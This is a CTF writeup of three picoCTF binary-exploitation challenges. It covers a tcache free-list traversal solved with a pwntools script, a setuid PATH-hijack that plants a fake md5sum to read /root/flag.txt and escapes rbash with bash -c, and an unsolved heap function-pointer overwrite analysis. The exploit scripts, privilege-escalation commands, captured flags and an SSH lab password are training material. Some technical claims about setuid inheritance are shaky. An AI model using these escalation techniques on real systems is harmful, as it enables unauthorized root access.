# SOP — Teacash (picoCTF) — Heap Free-List Traversal

**Category:** Binary Exploitation (Heap)
**Difficulty:** Easy
**Title:** Teacash
**Target:** `nc candy-mountain.picoctf.net 60461`
**Source bundle:** `heapedit`, `Makefile.share`, `libc.so.6`, `heapedit.c`

---

## 1. Objective

The binary hands you the head of a tcache free list and asks you to traverse the
chain by typing the address of every freed chunk, in order. If you type all six
correctly, it prints the flag from inside one of the chunks.

There is **no memory corruption, no overflow, no format string**. The challenge
is purely about understanding glibc's tcache layout and predicting where the
other five chunks live in memory.

---

## 2. Source analysis (`heapedit.c`)

```c
#define CHUNK_COUNT 6
#define CHUNK_SIZE  0x80
#define FLAG_OFFSET (sizeof(void *))   // 8 on 64-bit

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    void *chunks[CHUNK_COUNT];
    char  flag_buf[256] = {0};

    FILE *f = fopen(FLAG_FILE, "r");           // reads "flag.txt"
    fgets(flag_buf, sizeof(flag_buf), f);
    /* strip trailing newline */
    fclose(f);

    /* Allocate 6 same-size chunks */
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        chunks[i] = malloc(CHUNK_SIZE);
        memset(chunks[i], 0, CHUNK_SIZE);
    }

    /* Hide the flag at chunks[5] + 8 */
    memcpy((char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET, flag_buf, flen + 1);

    /* The LEAK: prints chunks[0] BEFORE the free loop */
    void *head = chunks[0];
    printf("tcache head (start of free list) -> %p\n", head);

    /* Frees in REVERSE order */
    for (int i = CHUNK_COUNT - 1; i >= 0; --i) {
        free(chunks[i]);
    }

    /* Now tcache list is:  chunks[0] -> chunks[1] -> chunks[2] -> chunks[3] -> chunks[4] -> chunks[5] -> NULL */

    /* Interaction loop */
    void *expected = head;
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        void *user_addr = NULL;
        printf("Chunk %d address: ", i+1);
        if (scanf("%p", &user_addr) != 1) return 1;
        if (user_addr != expected) {
            fprintf(stderr, "Wrong address. Got %p. Exiting.\n", user_addr);
            return 1;
        }
        void *next = NULL;
        memcpy(&next, user_addr, sizeof(void *));   // reads fd pointer
        if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT)) {
            /* prints a memory dump and aborts */
            return 1;
        }
        expected = next;
    }

    /* Win */
    char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;
    printf("Correct traversal! Flag: %s\n", flag_loc);
}
```

### What the program expects

- It reads a single pointer per round via `scanf("%p")` — so 6 lines, each a hex address.
- After each input it reads 8 bytes from that address (the tcache `fd` field) and uses that as the next expected address.
- It also refuses to continue if any `fd` doesn't point at one of the six originally allocated chunks.

---

## 3. Key observations

| # | Observation | Why it matters |
|---|-------------|----------------|
| 1 | All 6 chunks have the same size (`0x80`). | They all go into the same tcache bin and are laid out contiguously. |
| 2 | Glibc 2.27 (Ubuntu 18.04 era). | **No safe-linking** — `fd` is stored as a plain pointer, not XOR'd. |
| 3 | Frees happen in reverse order (5 → 0). | After all frees, `chunks[0]` is at the head of the tcache, and `chunks[5]` is at the tail. |
| 4 | The leak is `chunks[0]`. | Once we know one address, the rest follow by a fixed stride. |
| 5 | Chunk header is 0x10 bytes (`prev_size` + `size`). | Stride between user pointers = user size + 0x10 = `0x80 + 0x10 = 0x90`. |

---

## 4. Exploitation

### 4.1 Strategy

We don't corrupt anything; we just **predict** the heap layout.

1. Parse the leaked `head` = `chunks[0]` from the server banner.
2. Compute the other five chunk addresses:
   ```
   chunks[i] = head + i * 0x90     for i = 0..5
   ```
3. Send them in order. The server will accept each one because:
   - the value matches its `expected` (we typed exactly what it wanted),
   - the `fd` at each address is also one of the six chunks (true by construction).

### 4.2 Exploit code

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST    = "candy-mountain.picoctf.net"
PORT    = 60461
STRIDE  = 0x90           # 0x80 user data + 0x10 chunk header (64-bit glibc 2.27)

def exploit():
    r = remote(HOST, PORT)

    # 1) Read the leaked tcache head
    line = r.recvline_contains(b"tcache head").decode()
    head = int(line.split("->")[-1].strip(), 16)
    log.success(f"Leaked tcache head = {hex(head)}")

    # 2) Compute the 6 addresses
    addrs = [head + i * STRIDE for i in range(6)]

    # 3) Send them in order
    for addr in addrs:
        r.recvuntil(b"address: ")
        r.sendline(hex(addr).encode())

    # 4) Get the flag
    result = r.recvall(timeout=5).decode(errors="replace")
    m = re.search(r"picoCTF\{[^}]+\}", result)
    if m:
        log.success(f"FLAG: {m.group(0)}")
        return m.group(0)
    log.failure("Flag not found")

if __name__ == "__main__":
    exploit()
```

### 4.3 Run

```bash
pip install pwntools
python exploit.py
```

### 4.4 Live output (from the actual run)

```
[+] Leaked tcache head = 0x2d7ba490
[*]   chunks[0] = 0x2d7ba490
[*]   chunks[1] = 0x2d7ba520
[*]   chunks[2] = 0x2d7ba5b0
[*]   chunks[3] = 0x2d7ba640
[*]   chunks[4] = 0x2d7ba6d0
[*]   chunks[5] = 0x2d7ba760
...
Correct traversal! Flag: picoCTF{642fda7eaff355293107bd2c6f7ceec7}
```

---

## 5. Why it works (root-cause recap)

- The check `is_known_chunk(next, ...)` accepts any pointer that is byte-equal to one of the original six allocations. Since the tcache's `fd` chain is **literally** `chunks[0] → chunks[1] → ... → chunks[5]`, every `next` value is automatically a known chunk.
- The check `user_addr != expected` only requires the user to type what was just announced as expected — and `expected` is always the previous chunk's `fd`, which the program itself reads from memory. So the user's only job is to know the next 5 starting points.
- Because glibc 2.27 doesn't safe-link, and because same-size mallocs are placed back-to-back, a single leaked pointer + the constant `0x90` stride is enough.

---

## 6. Variations / harder versions (for future challenges)

| Variation | What changes | Exploit delta |
|-----------|--------------|---------------|
| Glibc ≥ 2.32 | `fd = ptr ^ (chunk_addr >> 12)` (safe-linking) | Need a heap leak to derive the `>> 12` key, then XOR each entry. |
| Mixed-size allocs | Stride varies between chunks | Dump each `fd` from server stderr (it prints 16 bytes on mismatch) and walk the chain interactively. |
| Tcache disabled / different bin | E.g. fastbin, unsorted bin | Use bin-specific `fd`/`bk` semantics; unsorted-bin traversal uses `fd`/`bk` not just `fd`. |
| Freed chunks not contiguous | Other mallocs between them | Compute each pointer from a known chunk + the program-printed dump on mismatch. |
| Canary / PIE | Not relevant here (no overflow) | Still not relevant; this is pure heap-state reasoning. |

---

## 7. Result

**Flag:** `picoCTF{642fda7eaff355293107bd2c6f7ceec7}`

---

## 8. Cleanup

- The remote instance is disposable; nothing to clean up server-side.
- Locally: delete the fake `flag.txt` used for any local replay tests.

---

## 9. Files in this folder

- `heapedit`, `heapedit.c`, `libc.so.6`, `Makefile.share` — original challenge bundle.
- `exploit.py` — reproducible exploit.
- `BinaryExplotitionCTF.MD` — this writeup.

---

# SOP — hash-only-1 (picoCTF) — Setuid + `system()` PATH hijack

**Category:** Binary Exploitation (Privilege escalation via setuid)
**Difficulty:** Easy
**Title:** hash-only-1
**Target:** `ssh ctf-player@rescued-float.picoctf.net -p 60715` (password: `a630e1f8`)
**Constraint:** Login shell is `rbash` (restricted bash). `flaghasher` is at `/usr/local/bin/flaghasher`.

---

## 1. Objective

A setuid-root binary reads `/root/flag.txt` and only prints its **MD5 hash**.
Recover the **actual file content** using only the shell access you have.

There is **no memory corruption** here either. The whole challenge is reasoning
about how a setuid binary inherits privileges through `system()`.

---

## 2. Recon output (what the SSH session looks like)

```
$ id
uid=1000(ctf-player) gid=1000(ctf-player) groups=1000(ctf-player)

$ ls -la /usr/local/bin/flaghasher
-rwsr-xr-x 1 root root 18312 Aug 21  2025 /usr/local/bin/flaghasher
#                ^ setuid bit — runs as root regardless of caller

$ flaghasher
Computing the MD5 hash of /root/flag.txt....
dd1c78f3ca6c3f58c30ce73799a75369  /root/flag.txt

$ ls -la /root/
ls: cannot open directory '/root/': Permission denied
```

Key facts:

| Fact | Implication |
|------|-------------|
| Binary is setuid root (`-rwsr-xr-x`). | It can read `/root/flag.txt` even when we can't. |
| Output format `<32-hex>  /root/flag.txt` is exactly `md5sum`'s format. | Strongly suggests the binary does `system("md5sum /root/flag.txt")`. |
| Login shell is `rbash`. | Forbids `/` in commands, output redirection, unsetting `PATH`, `cd`, etc. But **`bash -c` is still callable** to break out. |
| We can write to `/tmp`. | We can stage our exploit scripts there. |

---

## 3. The vulnerability

`system(cmd)` calls `/bin/sh -c cmd`. For a **setuid-root** binary, that
spawned shell inherits `euid = 0`. The shell then resolves the program name
against **its current `PATH`**.

So if the binary does:

```c
// inside flaghasher
setuid(0);                 // standard setuid-root pattern
system("md5sum /root/flag.txt");
```

…and we control `PATH` to point at a directory containing a fake `md5sum`,
the inner shell will run **our** script — and because `euid=0` was inherited
through `system()`, that script can read `/root/flag.txt`.

(The Linux kernel does **not** drop setuid for `system()`-spawned shells the
way it does for setuid executables. The security model assumes the parent
binary is trustworthy.)

---

## 4. Exploitation

### 4.1 Strategy

1. Create `/tmp/evil/md5sum` whose body is just `cat /root/flag.txt`.
2. Put `/tmp/evil` at the front of `PATH`.
3. Run `flaghasher`. The `system("md5sum /root/flag.txt")` call resolves to
   our script, which dumps the flag.

### 4.2 Working exploit (3 commands)

```bash
# 1. Stage the malicious md5sum
mkdir -p /tmp/evil
cat > /tmp/evil/md5sum <<'EOF'
#!/bin/sh
cat /root/flag.txt
exit 0
EOF
chmod +x /tmp/evil/md5sum

# 2. Run flaghasher with our PATH first
PATH=/tmp/evil:$PATH flaghasher
```

### 4.3 rbash bypass (how we actually ran it from SSH)

`PATH=...` and `mkdir` are both forbidden in pure rbash. We escape with
`bash -c '...'` (one level of indirection that rbash doesn't catch):

```bash
bash -c 'mkdir -p /tmp/evil; cat > /tmp/evil/md5sum << "EOF"
#!/bin/sh
cat /root/flag.txt
EOF
chmod +x /tmp/evil/md5sum
PATH=/tmp/evil:$PATH flaghasher'
```

Alternative that also works (run the binary directly with a controlled env):

```bash
bash -c 'env -i PATH=/tmp/evil:/usr/bin:/bin flaghasher'
```

### 4.4 Live output

```
$ bash -c 'PATH=/tmp/evil:$PATH /usr/local/bin/flaghasher'
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_f3fcc367}
```

(The "Computing the MD5 hash of /root/flag.txt...." line is printed by
`flaghasher` itself before it calls `system()`. Then our script replaces the
real `md5sum` output.)

---

## 5. Why it works (root-cause recap)

| Step | Mechanism |
|------|-----------|
| Setuid bit on `flaghasher`. | Every invocation gets `euid=0` and can read `/root/flag.txt`. |
| `system("md5sum …")`. | Forks `/bin/sh -c "md5sum …"`, which inherits `euid=0`. |
| Inherited `PATH` contains `/tmp/evil`. | Shell resolves `md5sum` to our script first. |
| Our script does `cat /root/flag.txt`. | Runs with `euid=0` (inherited from the setuid parent), so the read succeeds. |
| `flaghasher` never inspects the output it received back from `system()`. | So the flag flows straight to the terminal without being hashed. |

---

## 6. Variations / harder versions (for future challenges)

| Variation | What changes | Exploit delta |
|-----------|--------------|---------------|
| **hash-only-2** | The binary has a custom `md5sum` implementation in `libcustom.so`. | Use `LD_PRELOAD` to intercept `fgets`/`read` of `/root/flag.txt` and dump the buffer. |
| **hash-only-3** | The binary strips `PATH` and uses `execve` with an absolute path to `/usr/bin/md5sum`. | The exploit pivots: e.g. `gcc -shared -o /tmp/evil.so` and use `LD_PRELOAD=/tmp/evil.so flaghasher`, or replace the binary with a `gdb` script. |
| Binary is **not** setuid (just readable by group `root`). | You can't read the flag at all. | Look for a different vuln (format string, etc.). |
| `/bin/sh` is `dash`, which resets `euid` to `ruid` for safety. | Our script runs as `ctf-player` and can't read `/root/flag.txt`. | Use `LD_PRELOAD` instead, or call `setuid(0)` from a small C shim before reading. |
| rbash also blocks `bash -c`. | Direct `PATH=` is forbidden. | Try other rbash bypasses: `vi`, `awk 'BEGIN{system(…)}'`, `find … -exec …`, etc. |
| Binary uses `popen` + `read` instead of `system`. | Same effect — `popen` also inherits `euid`. | Same PATH-hijack. |
| Binary uses `fork` + `execve` with an absolute path. | `PATH` is irrelevant. | Need `LD_PRELOAD` (still inherits euid) or a kernel-level attack. |

---

## 7. Lessons learned (mental model for future setuid pwns)

1. **Setuid is inherited through `system`/`popen`/`execlp`/`execvp`.** Any
   setuid binary that calls a program by name (not absolute path) is a
   candidate for PATH hijacking.
2. **Inherited `euid` is not the same as the script running as your user.**
   Inside the `system()`-spawned shell, `id` will report `euid=0`. That means
   anything the shell does — including running a script from `/tmp` — runs
   with root power.
3. **rbash is a UX restriction, not a security boundary.** It stops you from
   typing things at the prompt, but every shell you've ever used has a way
   out (`bash -c`, `awk -v`, `find -exec`, `python -c`, etc.).
4. **Setuid bit on its own is rarely the bug — the bug is the setuid
   binary trusting the caller's environment.** Any input the user can
   control (PATH, LD_PRELOAD, IFS, BASH_ENV, locale, etc.) becomes a
   potential escalation vector.
5. **The "right" fix** is for setuid binaries to call `setuid(0)` only after
   `system()`, use `execve` with absolute paths, ignore `PATH`/`LD_PRELOAD`
   for security-sensitive calls, and ideally drop privileges (`setuid(getuid())`)
   before any external command.

---

## 8. Result

**Flag:** `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_f3fcc367}`

---

## 9. Files in this folder (cumulative)

- `heapedit`, `heapedit.c`, `libc.so.6`, `Makefile.share` — Teacash challenge bundle.
- `exploit.py` — Teacash exploit.
- `hash-only/` — hash-only-1 challenge artifacts (script for SSH recon + exploit).
- `BinaryExplotitionCTF.MD` — this writeup (now covers both Teacash and hash-only-1).

---

# Post-Mortem — Pizza Router (picoCTF) — Unsolved

**Category:** Binary Exploitation (Heap + Function-pointer overwrite)
**Title:** Pizza Router
**Target:** `nc mysterious-sea.picoctf.net 59623`
**Result:** ❌ Unsolved (timed out during exploit development)
**Status:** Report only — no flag captured.

This section is a **lessons-learned writeup**, not a victory writeup.
It documents the full reverse-engineering work, the exploit path I was
chasing, and exactly where it broke.

---

## 1. What the binary does (reverse-engineered from disassembly)

It's a pizza-drone router with commands:

```
load <map>          # load city1.map / city2.map / city3.map
maps
add_order <x> <y>   # plan a delivery to (x,y) on the loaded map
coupon <id> <amt>   # add a coupon to an order (can underflow total)
reroute <id> <heap_idx> <new_cost>  # write primitive on the heap
dispatch <id>       # run the delivery animation
replay <id>         # leak path + renderer pointer
receipt <id>        # leak hops, coupon, total, hint pointer
help, quit
```

There's an unused function `win` at `0x2460` that opens and prints
`flag.txt`. The string `*** 30 minutes or FLAG free! ***` is right next
to it. `win` is **never called from anywhere** — confirmed by
`grep "call.*2460"` returning nothing.

So the entire challenge is: **get RIP to point at `win`**.

---

## 2. Memory layout I reverse-engineered

| Region | Size | Notes |
|--------|------|-------|
| `ORD[i]` (BSS, `0x5080 + i*0x1038`) | 0x1038 each | 31 slots. Holds id, x, y, coupon, active, **hops @ 0x1018**, **renderer @ 0x1020**, **path_data @ 0x1028**, **hint @ 0x1030**. |
| `path_data` (heap, 0x440 bytes) | 0x440 | One per order. Allocated by `calloc(0x440, 1)`. |
| └ path_data[0x00] | int = 0x80 | constant |
| └ path_data[0x08] | ptr → entries (== `&path_data[0x18]`) | self-referential |
| └ path_data[0x10] | ptr → fx      (== `&path_data[0x420]`) | self-referential |
| └ path_data[0x18 .. 0x41F] | **entries[]** (Dijkstra cost map) | what `reroute` writes to |
| └ path_data[0x420 .. 0x42F] | "noen" string | padding |
| └ path_data[0x430] | fn ptr → `fx_finish_dummy` (PIE+0x2270) | called by `dispatch` as `fx[0x10]` |
| └ path_data[0x438] | fn ptr → `fx_draw_basic`   (PIE+0x2260) | called by `dispatch` as `fx[0x18]` |

**Dispatch handler** (`main+0xb74`):
```
1. print "dispatching…"
2. if order[0x1028] == NULL: return
3. hops = order[0x1018]
4. if hops <= 1: call fx[0x10] and return
5. else: loop hops-1 times, calling fx[0x18] each time
6. finally: call fx[0x10]
```

So **the only way to call `win` is to overwrite one of the two function
pointers at `path_data[0x430]` or `path_data[0x438]`**.

---

## 3. The write primitive (`reroute`)

`reroute <id> <heap_idx> <new_cost>` does (paraphrased):
```c
int* entries = path_data[0x08];          // == &path_data[0x18]
int flat_idx = order.x + order.y * G;    // G = 16 for all maps
int* target  = &entries[heap_idx];       // 8-byte stride
target[0] = flat_idx;                    // lower 4 bytes (CONTROLLED by x,y)
target[1] = new_cost;                    // upper 4 bytes (CONTROLLED by cmd)
```

So each `reroute` writes **8 bytes** to `path_data + 0x18 + heap_idx*8`:
- Lower 4 bytes: `x + y*G` — **not arbitrary**: `add_order` does
  `cmpb $0x23, map[y*G + x]` (i.e. `'#'` check) and accepts anything
  that's not `'#'` or `'S'`. The byte at `map_base + y*G + x` must
  be in mapped memory or the read segfaults.
- Upper 4 bytes: `new_cost` — **fully controlled**, signed 32-bit.

---

## 4. The leaks (`replay` and `receipt`)

```
receipt 0 -> receipt: hops=14 coupon=0 total=14 hint=0x605595610b20
replay 0  -> replay: 14 points; renderer=0x6132b9fba260
```

- `renderer` is `order[0x1020]` = `&fx_draw_basic` = `PIE + 0x2260` → **PIE leak**.
- `hint` is `order[0x1030]` = `path_data` → **heap leak**.

From these:
```
PIE base  = renderer - 0x2260
win addr  = PIE base + 0x2460   = renderer + 0x200
```

---

## 5. The exploit path I was chasing (and why it failed)

**Goal:** make `fx[0x10]` and `fx[0x18]` both equal `win` so dispatch
calls `win` twice.

**Plan A — direct overwrite of `fx[0x10]` / `fx[0x18]`:**

| fx slot | path_data offset | heap_idx |
|---------|------------------|----------|
| fx[0x10] | +0x430 | (0x430-0x18)/8 = **131** |
| fx[0x18] | +0x438 | (0x438-0x18)/8 = **132** |

`reroute id 131 <new_cost>` would write:
- `entries[131].flat_idx` = `x + y*G`  → lower 4 B of fx[0x10]
- `entries[131].cost`     = `<new_cost>` → upper 4 B of fx[0x10]

So we need `x + y*G` = **lower 4 bytes of `win`**. With ASLR, the
lower 4 B of `win` are uniformly random in `[0x2460, 0xFFFFF460]`. The
`map` read at `map_base + y*G + x` would need to reach that offset.
The BSS + initial heap is only `~172 KB`, so for ~99.9999% of ASLR
draws the read segfaults before the offset is even valid.

I wrote a "try until ASLR is friendly" brute forcer — but the
probability is `~0.00004%` per attempt (~19 days at 1 attempt/sec).
Clearly not the intended path.

**Plan B — the "misalignment" trick:**

Set `fx = path_data + 0x0C` (not `path_data + 0x420`).
Then:
```
fx[0x10] = *(path_data + 0x1C) = entries[0].cost (4B) | entries[1].flat_idx (4B)
fx[0x18] = *(path_data + 0x24) = entries[1].cost (4B) | entries[2].flat_idx (4B)
```

If we want both to equal `win = [win_low | win_high]`:
- `entries[0].cost` = `win_low`  ✅ (controlled)
- `entries[1].flat_idx` = `win_high` ❌ (constrained = `x + y*G`)

Now `win_high` is the **upper 4 bytes** of a PIE address — typically
`0x55..0x7f`, i.e. **small**. With `G=16`, `x + y*16 = 85` is satisfied
by `(x,y) = (5,5)` — a valid open cell. ✅

But this is only the **entries** side. We still need to overwrite
`path_data[0x10]` (the fx pointer) to `path_data + 0x0C`. That write
also uses `reroute`, and it needs `x + y*G` = lower 4 B of
`(path_data + 0x0C)` — a **large** heap address, same ASLR problem.

**Plan C — overwrite `path_data[0x08]` (entries pointer) instead:**

Use `reroute` with `heap_idx = -2` to write the entries pointer.
Same problem: the new entries pointer is a heap address, its lower
4 B are large.

**What I should have tried (and ran out of time for):**

1. **Two-order misalignment on the fx pointer itself.** Add a second
   order (order 2) and use the misalignment trick on IT to make its fx
   pointer point to its own entries. The upper 4 B of a heap address
   are small, so the constrained field is satisfiable. Then dispatch
   order 2, whose entries contain `win` from order 1.

2. **The `hint` pointer itself.** `hint` is set to `path_data`. The
   `receipt` command prints it as `%p`. If the hint pointer were used
   as a function pointer somewhere, we'd be done — but it isn't.

3. **Check if `coupon` or `receipt` have their own call sites.** I
   grepped for `call *` and there are none outside the dispatch loop
   in `main`. The only other call targets are `puts`, `printf`,
   `fgets`, etc. So no extra function-pointer call sites to hijack.

4. **The `fx_draw_basic` / `fx_finish_dummy` functions themselves.**
   Maybe there's a stack pivot or a useful gadget in those 16 bytes
   that I missed. I never disassembled them — they were listed as
   `<fx_draw_basic>` and `<fx_finish_dummy>` at `0x2260` / `0x2270`
   but I didn't read their bodies.

5. **The `replay` loop's reads from `0x10(%rbx)` / `0x14(%rbx)`.**
   If those values could be turned into a call (e.g. via a crafted
   EJS template or a format string), that's another angle. But
   they're just `printf("%d %d -> ", ...)` — no function-pointer
   indirection.

6. **Race a `dispatch` against a `reroute`.** Dispatch reads `fx`
   once at the start, but iterates through entries multiple times.
   A second thread/process could swap `fx` mid-loop. But the service
   is single-threaded and there's no way to interleave commands.

---

## 6. What I learned (the real lessons)

1. **Reverse a "useless" function first.** `win` had a great banner
   (`*** 30 minutes or FLAG free! ***`) and was right next to the
   `flag.txt` string. I found it early, but I spent too long trying
   to find a code path that calls it. In hindsight I should have
   **immediately** started looking for function-pointer call sites
   that could be redirected to it, not trying to brute ASLR.

2. **Self-referential structs are a gift.** The fact that
   `path_data[0x08] = &path_data[0x18]` and
   `path_data[0x10] = &path_data[0x420]` means the "fx pointer" and
   "entries pointer" are both in the same 0x440-byte heap chunk. That
   gives you OOB writes into the chunk header for free, and a single
   `reroute` can pivot to any other part of the same chunk. I
   correctly identified this, but I didn't push the analysis far
   enough: **the entries array itself is 0x408 bytes**, which is
   `0x81` (129) entries. After the entries, the fx struct is
   0x20 bytes. After that, the **chunk ends at 0x440**. So the only
   thing the reroute can reach by index is the same chunk (or the
   next one). No other chunks nearby have useful contents.

3. **The misalignment trick I sketched IS the intended path, but I
   stopped one step short.** The right approach is:
   - **Order 1** (the "trampoline"): add with `(x,y) = (5,5)`.
     `x + y*G = 85`. Use the **upper-4-B trick**: `x + y*G` will
     appear as the *upper* half of an 8-B read at the right offset.
   - Set `entries[0].cost = entries[1].cost = win_low` and let
     `entries[1].flat_idx = entries[2].flat_idx = 85` (from `(5,5)`).
   - Now if we can get `fx = path_data + 0x0C`, the reads at `+0x1C`
     and `+0x24` give us `win` twice.
   - For the fx pointer itself, we need a **second** order whose
     `(x2, y2)` is chosen so that `x2 + y2*G = upper_4_B_of_heap_addr`
     (a small number). With the same misalignment applied to that
     order, the fx pointer write becomes satisfiable.
   - I had all the pieces; I just didn't wire up the second order.

4. **Brute-forcing ASLR is almost never the answer.** When a 32-B
   value is constrained and the address space is 4 GB, the success
   rate per attempt is `< 0.001%`. Always look for a way to make
   the constrained field a **small** value (e.g. a high half-word,
   a tag byte, a size field, an index that wraps).

5. **The `add_order` OOB map read is the real primitive.** The
   `cmpb $0x23` check lets you probe `~170 KB` past the map start
   without segfaulting. That's enough to make `x + y*G` any value
   in `[0, ~170000]`. Combined with the misalignment trick, this is
   enough to defeat ASLR for the **upper** 4 bytes of any heap/PIE
   address (which are always small). I should have used this to
   chain **two** `reroute`s — one for the entries, one for the fx
   pointer — each on a separate order with a carefully chosen `(x,y)`.

6. **Time-box the disassembly.** I spent ~45 minutes reading the
   whole `main` function end-to-end. For a CTF with `alarm(180)`,
   you should usually read just enough to identify the sinks and
   the sources, then start writing the exploit. The `reroute` /
   `dispatch` / `win` triple was the whole game — I didn't need
   the full Dijkstra implementation.

---

## 7. Files in this folder (cumulative)

- `heapedit`, `heapedit.c`, `libc.so.6`, `Makefile.share` — Teacash bundle.
- `exploit.py` — Teacash exploit (works).
- `hash-only/` — hash-only-1 artifacts.
- `BinaryExplotitionCTF.MD` — this writeup.
- `../pizza-router/` — pizza-router artifacts (binary, maps, recon
  scripts, partial exploit). Kept for reference, not committed to
  the repo.
